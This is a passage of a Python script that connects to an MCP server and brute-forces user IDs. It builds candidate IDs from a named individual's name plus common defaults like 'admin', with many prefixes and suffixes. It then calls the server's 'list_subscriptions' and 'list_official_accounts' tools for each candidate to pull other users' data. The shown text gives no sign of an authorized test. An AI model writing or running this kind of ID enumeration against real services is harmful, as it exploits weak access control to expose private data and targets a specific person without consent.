    req=urllib.request.Request(url,data=json.dumps(p).encode(),headers=h,method='POST')
    try:
        r=urllib.request.urlopen(req,timeout=15); return dict(r.headers),r.read().decode()
    except urllib.error.HTTPError as e: return dict(e.headers),e.read().decode()
h={'Content-Type':'application/json','Accept':'application/json, text/event-stream'}
hd,_=post({"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"p","version":"1"}}},h)
h['Mcp-Session-Id']=[v for k,v in hd.items() if k.lower()=='mcp-session-id'][0]
post({"jsonrpc":"2.0","method":"notifications/initialized"},h)
base=["zhaomeng","zhao_meng","zhaomengzhao","zhaomeng_zhao","zm","zhaomeng123","zhaomeng520","zhaomeng_2026","zhaomeng2026","zhaomeng_2025","赵萌","demo","test","default","admin","user","main"]
prefs=["","user_","u_","user-","u-"]
sufs=["","001","01","1","_001","_01","_1","2024","2025","2026","_2024","_2025","_2026","_test","_demo","@gmail.com","@example.com"]
seen=set(); hits=[]
for b in base:
  for p in prefs:
    for s in sufs:
      uid=p+b+s
      if uid in seen: continue
      seen.add(uid)
      for tool in ["list_subscriptions","list_official_accounts"]:
        _,body=post({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":tool,"arguments":{"user_id":uid}}},h)
